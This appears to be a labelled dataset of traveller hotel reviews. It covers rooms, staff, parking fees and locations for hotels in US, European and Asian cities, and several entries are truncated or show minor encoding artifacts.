"decent hotel in universal city my husband booked the room with the hilton directly for the 2 of us. upon arrival , we were given a room with 2 double beds, even though we had requested a king or queen. they have no wait list , so we had to check everyday to change rooms. finally two days later a king was available, though they had no record at all of our request! after speaking to no less than 6 people! none the less, the rooms were very clean , very spacious with decent views. room service menu is extensive and the food was excellent (pricey, of course).the pool is very nice with an oasis like feel with lawn and cabanas , but poolside service is lacking. you have to really hunt for menus and a phone to place an order. it seems it would benefit everyone greatly to have easy access to smoothies, snacks and cocktails poolside. nice hottub also.it is a very large hotel so there is no real personal service, and often long waits for the elevator. the location is ideal, of course, for universal area attractions, but a long way from lax, hollywood and the beach. self-park is $15 a day, valet $20 a day.overall nice property. i would return if i had an event in burbank/universal city area.",0

"Chic, modern and uber cool The most sleekly sophisticated hotel I've ever seen, the St. Regis sets a very chic tone with uber-cool colors and designs from the bar to thelobby to the rooms. It's like having your own townhome at the Met or other modern art gallery. For all the formal style to charm the eye there is a great deal of pampering in the perfect beds/linens, inviting bathroom with great bath samples, and the great staff who know how to be formal when necessary but also know when to be warm and friendly.From the personal butler to the restaurant staff to concierge to the folks behind the scenes cooking and cleaning you are made to feel very special. I must complement the cleaning staff who truly outdid themselves to make my room spotless. I could have easily eaten off the bathroom floor.The rooms themselves are fun with cool gadgets that made our stay memorably relaxing. Even my 70+ parents enjoyed the views, the bathtub, and the cool remote controls.Sure you hear some street noise at night even 17 floors up but it is San Francisco (ear plugs for very light sleepers would easily resolve any issues and I'm sure your butler would accomo",0

"great hotel - very noisy because of weekend parties my husband and i recently stayed at the hyatt regency century city for the memorial day weekend. the room was great. the lcd tv, and the well stocked bathroom were a real plus. the staff was friendly and very helpful. we walked to wilshire and beverly drive easily on friday afternoon for a huge sandwich at our favorite deli nate n' al's. the location of the hotel could not be beat as it was a business district, and therefore quiet during the daytime hours.the one downside of the overall weekend was the amount of noise from the meeting hall area at the lower level of the hotel that occurred in the evenings. we were on the 10th floor so we probably did not have it as bad as most people, but the music from a two parties held on the saturday and sunday evening was excessive. thankfully a 12 hour day at disneyland made us so tired that we slept through much of the noise. the staff was very accommodating in letting us know when the parties would be over, and expressed their apologies. the room was a bargain as it was booked through an expedia package. however, one should always beware of such a cheap rate at a classy hotel such as this.",0
not recommended!! stayed at the roosevelt on business. it was really a grand dissapointment. the room was not clean and the bed noisy and uncomfortable. parking is a real problem since the hotel valets accept anyone. expect to wait an hour or two to park at your own hotel during the early to late evening!! the staff did not provide very good customer service. they charged me for a night i did not stay and never returned repeated calls to solve the problem. the quality of food in the restaurant was very low. there are so many better places to stay and eat in la. will never stay here again!!!,0

"great property we've stayed at this hotel several times over the last 5 years. its a great property that the kids love going to. here are the highlights:pros:-lots to do for the kids, mini golf, lazy river, large pool with waterfall-you need a car in phoenix but the resort is fairly close to high end shopping-the hotel is well designed (but it takes a while to figure out) and allows you to park close to your room-the coyote camp is fabulous, say the kids, they've been to 40-50 hotels and they talked about coyote camp the most. staff at the camp is wonderful and are the same from our visits 5 years ago.cons:-no restaurants within walking distance -service in cantina restaurant takes a long time (food is good)-service in hole in the wall restaurant is very slow-pool side service was inconsistent, good one day very slow the next (it didn't seem to matter if gave a generous tip either)we ate mostly off property but used the resort so service wasn't an issue.we've stayed in everything from casitas to normal rooms and everything has accomodated our family of four. (kids 79 yr old)all in all we love this property and will continue to go there until we buy our own place in sun valley.",0

"just horrendous - do not stay here my family and i normally stay in upscale hotels when we travel, but we have pretty reasonable expectations. in other words, one wrong thing here and there will not bother us. that being said, this is the worst hotel i have ever stayed at ...by far! i don't even know where to begin...employees were extremely rude and disrespectful during our check-in. we had arranged for early check-in over the phone, yet they claimed no such arrangement was made and refused to give us a room. we had a really tired little one with us, which made all this even worse. anyhow,a few points, to keep it brief:* hotel is pretty run down: public restrooms were missing locks, doors were scraped, soap dispensers broken; rooms are small and completely out",0

"great stay with a surprise! the millennium biltmore hotel is convienently located in downtown los angeles near freeway access, shops, and a plaza across the street. the lobby and public spaces are beautiful, full of classic moldings and decorations. if you like history, you would enjoy staying here! you feel like you are walking back in time as you walk through the halls and lobby. there is even a hall full of photos from the first academy awards ceremony held in the ballroom. we had no problems with the people who worked at the hotel, from the check-in clerk to the valet parking attendents. everyone was nice and friendly to us. our room, which we booked on priceline, was upgraded to a suite! what a pleasant surprise! there were four of us, my husband and i and our two young children, so the extra space was a wonderful bonus. the suite was the size of a small apartment, complete with a small entry hall, huge living room and dining room plus wet bar and refrigerator, and a separate spacious bedroom (with 2 double beds) and bathroom. there were two tvs, so the kids could watch their shows on one. the rooms were all clean and nicely furnished. the windows had shutters which blocked out the sunlight in the morning. our suite was located on a corner, so we could see across the street towards pershing plaza and over the roof top of a lower building. we felt very comfortable and safe staying here.i peeked into a standard room, and i can report that a standard room is just as spacious as an average hotel room. the same as the bedroom in our suite. i would not have been disappointed with a standard room at all!and all the reviews that mentioned no coffee maker...we had one, maybe it came with the suite. but you can always request a coffeemaker for free--it is stated in the hotel's guest room book. it also includes packets of coffee and paper cups with sip and go lids. our only complaint about the room was that the water temperature in the bathroom was uneven. this happened a lot with the shower. the water temperature from the sink was ok. also, it took forever for any hot water to reach us during the slow time (wed thurs) in the hotel. once there were more guests on friday and saturday did the hot water come on as soon as we turned it on. i think they need to upgrade the bathrooms, especially the showers!although we understand that parking space is a premium in downtown la, or anywhere in la for that matter, we weren't thrilled about the $24.00 per day valet parking fee. yes, there are other garages across the street and around the block, but they charge a $6.00 fee for evening entry (between 5pm-12am) and then they charge $2.00 per hour after 12am. the total comes out to be close to $24.00--not much of a savings there. we figured that the money we saved on the hotel room went toward parking, so overall everything evened out at $100 per night. which is still a great deal for downtown la with parking included!overall, we had a great stay and would definitely recommend the biltmore to anyone!",0

"good quiet easy located hotel excellent location, room had everything i wanted, bath/safe.except no kettle, only coffee maker, but not a big problem.room was quietly located. initially i had booked this hotel for only 1 week, just in case i didn't like it, but because i was happy with room and location i decided to book another week and i didn't have to change room!the bed was very comfortable and had big tv. room generally very clean.staff pretty good, except on two occasions i managed to change travelers cheques, on the third another receptionist said they weren't allowed to, which is strange as the other receptionist did, especially as i thought travellerscheques were widely accepted in usathere is an internet cafe right next door, which is also connected through the hotels reception.hotel is centrally located only about less than 10 mins walk to powell street bart and cable cars. there are plenty of cafe's etc on the hotels road.although there are a few homeless people about they really do not bother you, otherwise you can get an no.38 bus right on the road.",0

"could be a great hotel just came back from long weekend stay at this hotel. first my complaints:1) front desk needs better people skills. i had confirmed reservations (with a copy of the email) and they still argued about the rate. when we checked out they tried again to overcharge us. 2) the valet parking is a joke. they lost our car several times and took forever to get it when they did find it!3) my friends room had numerous carpet stains and smelled musty.4) we had to ask for the robes and the towels are way too thin- need to be upgraded. our room safe never locked consistently. i would guess all of the above are due to inexperienced management. it is the little things that make a stay enjoyable.however- the concierge (ben) was fabulous. he made us several wonderful and hard to get reservations for dinner, put up with us changing the time constantly and was able to get us in to the tropicana bar. he basically saved our trip for us. we ended up spending alot of time out by the pool, enjoying the private club atmosphere. i will be sending a letter to the management about the problems we encountered along with a letter to the concierge thanking him.like i said- this could be a great hotel.",0

"pleasantly surprised my wife and i took a weekend trip up to san francisco and wanted to stay at a place that was cheap and close to fisherman's wharf. this place did not disappoint.our room was only $99 per night through some promotion found on travelzoo. i figure you get what you pay for... but the room was actually pretty nice. there wasn't much of a view (i think the window faced the adjacent building) but the room was fairly large, clean, and the room (as well as the whole floor) was nice and quiet. there was a very private feel to the hotel. they also had a staffmember serve soda and wine in the loungy lobby area in the early evening, which was a nice bonus. the surrounding area of the hotel, to our surprise, seemed safe and relatively clean. but the location was great... just a few blocks from the touristy parts of the wharf. would definitely recommend this hotel for your next brief stay in the bay.",0

"ideal location and great value a small, apparently family-owned hotel located just a few steps from plaza mayor. ideally located for all major attractions in madrid. the staff are very friendly and helpful, even loaning us a nokia phone charger and checking the location of a restaurant that another tripadvisor traveller had recommended.we booked directly with the hotel, through its website, having seen a recommendation in the saturday travel section of the daily telegraph in july 2008. initially, we requested a corner room (as others had suggested) at 95 euros per night, but enquired about the suite. the hotel replied within 12 hours, confirming its availability. at 120 euros, we thought it very good value, considering its size (basically, in the hotel attic/loft) and facilities (a super outside terrace - 6 floor up and with views over the madrid rooftops!). the only slight downsides were a bed that began to feel a little hard after 4 nights (it is a firm mattress onto a solid divan) and some small amount of noise that permeated the roof (although these were police sirens, and so very loud). you also need to lug bags up the final short flight of steps from the 5th floor, as the lift stops there, so it's worth remembering for those who may struggle. my wife was not so impressed with the lack of a mirror in the room, although there is one with ample lighting in the bathroom. the tv has a variety of european channels, plus cnn and eurosport. there was also (what appeared to be) a dvd player, though we didn't use it.we visited at an exceptionally hot time (late 30s celsius), but the room aircon worked well and the curtains and roof blinds (for the 3 velux windows) kept out the heat and light. others have criticised the bathroom for 'only' having one sink! however, we found this to be ample, as it is large and square. the shower could easily accommo",0
"A 3 Star Hotel with a 1 Star Price The Hotel Montreal is truly a great find and superb value. In May, 2007, we stayed in a triple room with private bath for 4 nights. Florence is a compact city. The historical center and River Arno were within easy walking distance from the hotel. One of the best reasons to stay at the Montreal was its proximity to the SMN train station and public transporation. It was convenient and easy to visit local sights, and make day trips to Siena, San Gimignano, etc. Next to the hotel was a small bar. For our stay, we could not hear any music or talking at nighté¥?thanks to the nicely insulated windows. We felt safe strolling about the neighborhood at 10, 11 PM. There were small shops close by where we purchased water, snacks and fruit. Gelaterias near the station offered tasty gelato and low-cost sandwiches. We found ATMs, Internet shops, travel agencies and a good number of restaurants within a three block radius of the hotel. One restaurant, only a half block away, featured hearty pizza and traditional Italian fare, at a discount to the hotel guests. Our room was in the back of the hotel. It was very clean, tastefully furnished, and considerably larger than many of the hotel rooms we stayed in Europe. The bathroom, in contrast, was quite narrow. The sink, bidet, toilet, and shower lined up right next to each other. The fixtures were relatively new and functional. Great water pressure, and no lack of hot water. With two large windows that opened, our laundry dried overnight. Everyday of our stay, we found 4 sets of oversized and thick towels in our room. The AC was very effective, quiet, and adjustable. The large dresser offered ample room to hang our outfits, and still accommo",0

"great place to stay in sf! we stayed at the tuscan inn on halloween weekend of 2003. we had absolutely no problems whatsoever, the courtyard room we had was quiet, small and cozy. after all, who needs a huge fancy suite when you have a city like san francisco to explore?! the location is perfect, right near the wharf and lots of restaraunts shops. also, it is a block away from the trolley turnaround. there was a motorcycle rental place and a bicycle rental place 5 seconds away, which we took full advantage of. the tuscan also offered complimentary wine happy hour from 5-6pm in the warm cozy lobby where you can wind down your day and meet other hotel guests or just hang out by yourselves. we will stay there again if we ever return to san francisco!!",0

"This hotel is average. It's fine. Ok. Not so bad. If you have booked it already, do not worry, it will probably not be the best or worst hotel you should ever see. If you haven't booked it already...well...if you want to be near happy valley go right ahead. If not, think about what part of town you want to stay. It's 10 mins walk from the underground and about the same as well from the tram. That said, taxis are incredibly cheap in Hong Kong and it has a taxi rank underneath but the traffic can be a pain at peak times.There was nothing bad about the stay, just the hotel didn't bowl me over so I should concentrate on the good things:great views from higher floors of happy valley race track and neighbourhood skyscrapers; proximity to happy valley; it's cheap; room big-enough; room was clean and modern (bathroom more ",0

"great hotel for pre-cruise my family stayed here for one night before going out on our cruise on july 25,2007. i would highly recommend this hotel as the price isn't to bad and the hotel was nice and clean! i travel alot and am very particular about my rooms. i had no complaints what so ever!! excellent location and there is a very nice area with shopping and lots of places to eat right across the street!! lots of nightlife with music outside!! nice place to unwind after airports all day!! they have sleeper sofa's in some of the rooms which i had a hard time finding at other hotels. if you ask for a late checkout they will give it to you! a cab is easily accessed for your trip to the port!!",0

"Simply Awesome!!!!! All I can say is WOW WOW WOW!!!!!!! I booked a circular suite (7th floor - the highest one available) because of a) a king bed, b) the view and c) the soaking tub. The hotel is extremely calm and peaceful, and it smells good everywhere you go. What really sets it apart, though, is the service. My husband and I are here celebrating our anniversary. I mentioned this when booking the room. We arrived 3 hours before check in, and the woman at the front desk was extremely friendly and polite. As it turned out, our room was ready (we were expecting to have to store our luggage). The view of the bay bridge is absolutely incredible. Around 10 minutes after we got into our room, (the luggage was brought up immediately following), a bellhop arrived with a bottle of sparkling wine, glasses, a plate with strawberries, grapes, ",0

"two night stay. nice view my fiance and i stayed there for two nights at the end of february.the good.nice view from our balcony.convenient location.many things around like lifetime fitness, restaurants, i-10, we paid only $99 per night for two nights, so that wasn't bad.had a nice little buffet breakfast in the morning.pool was nice and was heated.staff was very friendly and accomodating and gave us directions to a joyce meyer conference which was about 30 minutes away. very helpful.the bad.seemed like it could have a nice cleaning.our room was somehow connected to another room (which we didn't want or realize at first. our first night there no one was in the room next to us, but the next night people were there).that it made it very uncomfortable when we could hear and see the shadows of the peoples feet next to us under the door. it's a good thing they weren't doing anything, (at least we couldn't hear) uggghhh! otherwise we would have asked to switch rooms immediately. they shouldn't give you suites unless you actually pay for that, otherwise it makes for uncomfortable situations.overall, probably wouldn't stay there again, because there are so many other options in the phoenix area, but for our experience it was fun and were glad we picked it.",0

lovely hotel with friendly staff i stayed at this hotel for 3 nights last week. i stayed in a room with2 queen beds. the room was really roomy with plenty of light. the location is great at the top of nob hill (california and powell).the intersection of 3 cable car lines it takes you to fishermans wharfin 15 mins or union square in 4 mins. walkable down to union st but would recommend getting car back up. the third cable line takes you tochina town.the hotel is very nice indeed with a nice courtyard. the door staff/bell persons are super friendly and courteous. free complimentary town car in the mornings to the financial district. use of the car forthe same price as a cab if availble.the reception staff and concierge are helpful and make the hotel. eventhe gift shop staff are lovely.i would recommend this hotel for a good base to see san francisco.,0

"could be a lot better! well my family just got back from this resort. the resort it self is great, pools, beach, things to do all the time. the only issue is the rooms. when we got there we didnt have any water!...then when we did it was very little and it was very cold. the room had not light, extremely dim. the air conditioning was good. the beds were horrible and the pillows had to have been from 50 years ago...this is no exageration...come on, this place could at least invest in some pillows. any american looking to go hear i would highly advise not to stay in the villas. though this resort caters to all europeans and spanish people. talk about racism...thats them. the village we hear is very nice, closer to the beach and the swim up bar. that is were they put off them. they only give it to americans who have to complain everyday..we finally got offered to stay in the village our last day, that was after 5 days of complaining. the resort is seperated...villas go to americans...which are the worst ones to stay in, village to the spanish and the hotels part to the eurpoeans. if the room get way more up",0

"take the good with the bad my wife and i stayed at the century city plaza and spa for a long weekend this past summer. having not read the warnings on this website about the parking situation, my initial experience with the hotel was poor (i followed the self-park signs, was charged $20, only to be then told about the only hotel-affilitiated parking option - valet, which was also a frustrating $25 per day, no refund for the self-park, so started off down $50 for the first day of just parking). be prepared for this to avoid the initial damper on your stay.the hotel lobby and meeting area was nicely appointed with a plush seating area, full-bar, and big screen televisions. the backdrop for the lobby was the pool area, which can be seen through a wall of windows opposite the entrance. (however, i would guess the self-conscious would not find the concept of sunbathing in front of a bar audience to be a positive characterisitic). the pools themselves were not impressive, but i did enjoy boucing between the pool cool water and the nearby sauanas.our standard room was just that - standard. nothing special but nothing as dirty as some other folks apparently experienced. the bed was the highlight of the room. the highly hyped heavenly bed was quite heavenly. my wife and i slept like babies from the very first night and that is an accomplishment in itself. we have never before been able to get comfortable in a hotel bed on the very first night. the balacony was nice touch, albeit barely large enough for accommodate 3 people.the hotel staff was not memorable as being overly friendly nor exceptionally indifferent. we did have a problem with the safe in the room as it was locked and there was no key. when we called to the report the problem, we were treated as if we were just too stupid to find the key. they sent someone to the room to find the key and when they did not find it themselves, they offered to give us a safe deposit box. no big deal.the immediate area is not so great, but bev hills is not far. it didn't take much to get to the major highways either.overall i would say that the hotel was fair to above average.",0

"Superclubs less than Super January 15-22, 2005OverviewThis is only my second trip to an all-inclusive resort so my observations are not made with a whole lot of past experience. I wanted to post a review to help others since I found this site to be very helpful in preparing myself for this trip. When reading over all the past reviews I found it incredible that some would say this resort was 5 star while others found it to be terrible. From my experience I found it to be somewhere in between the two extremes. In short, while this resort has huge potential to be excellent, it falls well short of that mark. Keeping that in mind, if you are unwilling to roll with the punches the resort is bound to give you, steer clear of this resort. My biggest complaints are with the food quality and selection and secondly with the service/infrastructure. On the up side, this resort is in an excellent location, has lots to do and has some great facilities.TravelWe flew from Ottawa to Punt Cana on a West Jet flight chartered by Air Transit. No problems here. Again West Jet exceeded my expectations. Transfers at the airport were without issue. All those reports of the baggage handlers are unfounded as far as I am concerned. Just ignore them if you don???t want help.Check InCheck in at Breeze???s was ok. We were travelling for a wedding so there was fairly large group of us. The rooms were supposed to be together but when we got ours we found we were about as far as we could get from our friends.

"still wonderful -- new management made it even better! we've stayed at this inn five times now, and it's still a joy! it's under new management now, and the friendly new owner has added some great things: internet access in lobby, expanded continental breakfast, and complimentary yardley lavender bath products. the rooms are still very clean and neat. my only recommendation is to ask for a room that doesn't face on to the street -- it can get a bit noisy at times.",0
"location, location, location my wife and i decided 11 years ago that we would celebrate our 25th wedding anniversary in 2007 with a month touring the west coast of america. i'm always up for a months holiday but i'll be the first to admit my number 1 priority is value for money and thanks to the internet and ta, this is just what i found with this hotel. (i had 11 years to research it and stayed here!!)the location is perfect, right in the heart of the city and within walking distance of most major places of interest. (get a travel pass and everything is in reach via cable car/bus/muni).staff were extremely helpful and always had suggestions if we were looking for something to do or a route to a certain location.the rooms were clean and functional and to us brits, they were certainly of an adequate size.breakfast consisted of toast, muffins, dried fruit and natural yoghurt with tea coffee and juice, not too heavy and sets you up nicely for a day sightseeing.the lift is slow but we felt it added to the character of the hotel and caused us no problems.i would advise anybody visiting sf to seriously consider this as a base for their trip. we stayed 24-28 sept and paid $89 per night which i thought was good for a city centre hotel with breakfast.",0

"great stay overall, but some caveats we stayed in the lower parlor suite in 12/06. the location is wonderful: chelsea is safe, fascinating, and convenient to the subway and all of the museums, neighborhoods, and stores that you want to visit. staff were very helpful and accommodating; we were able to leave our luggage in the office upon early arrival and for several hours after checkout until our train left penn station, which is an easy, 15-min. walk. given the great restaurants in chelsea and subway/bus access to everything else, we did not use a single taxi. chelsea lodge is a great value, and we plan to return, but there are some caveats. first, the buildings are across the street from a school, which means that there is a great deal of noise from the students on school mornings. if you stay in a room or suite facing 20th street, be forewarned about this and other street noise; the windows are single-glazed, and the traffic and passerby noise will be sufficient to wake all but the most sound sleepers. second, while the kitchen and bathroom in our suite were very clean é¥?and the bed linens and towels were also very clean (with excellent maid service daily), our suite had the filthiest upholstered office swivel chair that we have ever seen - so filthy that we would not use it at all. and, while a swivel chair (which was the only upholstered chair in the apartment) makes good sense if guests need to open the futon or use the folding cot provided, there really is no excuse for such a dirty piece of furniture. the other furnishings were minimal and in relatively worn condition, but serviceable. do not expect rugs or curtains; our suite had no floor coverings and metal blinds in the windows. some additional lighting would be helpful; our suite had four very small lamps é¥?new, but just one (next to the bed) had a 3-way bulb. with no bright lamp next to the futon/couch, reading there can be difficult. the kitchen had a gas stove, full-size refrigerator, dishes and utensils for 4, and a coffeemaker, but there was no toaster (?) or microwave. there was a very nice tv/vcr with digital cable.we have stayed in all kinds of accommodations in manhattan and, overall, we had a great stay. but we will request a room or suite that does not face 20th street for subsequent visits. and we hope that the management will try to provide upgraded, cleaner furniture é¥?we saw some beautiful and very low-priced items at the wonderful thrift shops in the neighborhood, so replacing some of the existing furnishings should not cost a great deal.",0
